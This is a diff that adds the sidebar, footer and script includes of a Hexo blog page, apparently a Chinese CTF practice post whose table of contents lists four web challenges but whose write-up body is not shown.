+        <li class="links-of-blogroll-item">
+          <a href="https://soyawww.github.io/" title="https://soyawww.github.io/" rel="noopener" target="_blank">soya's Blog</a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+          
+          
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#HCTF-2018-WarmUp"><span class="nav-number">1.</span> <span class="nav-text">[HCTF 2018]WarmUp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUCTF-2019-CheckIn"><span class="nav-number">2.</span> <span class="nav-text">[SUCTF 2019]CheckIn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华北赛区-Day2-Web1-Hack-World"><span class="nav-number">3.</span> <span class="nav-text">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fakebook"><span class="nav-number">4.</span> <span class="nav-text">Fakebook</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cuo kon</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+    <span title="站点总字数">36k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+    <span title="站点阅读时长">33 分钟</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.2.0</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+  
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+    
+    
+  
+  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+
+  
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+
+
+  <script src="/js/utils.js?v=7.2.0"></script>
+
+  <script src="/js/motion.js?v=7.2.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.2.0"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.2.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.2.0"></script>
+<script src="/js/post-details.js?v=7.2.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.2.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.2.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+
+
+
+<script>
+  window.livereOptions = {
+    refer: '2019/12/12/ctf练习(2)/'
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+
+  
+
+</body>
+</html>
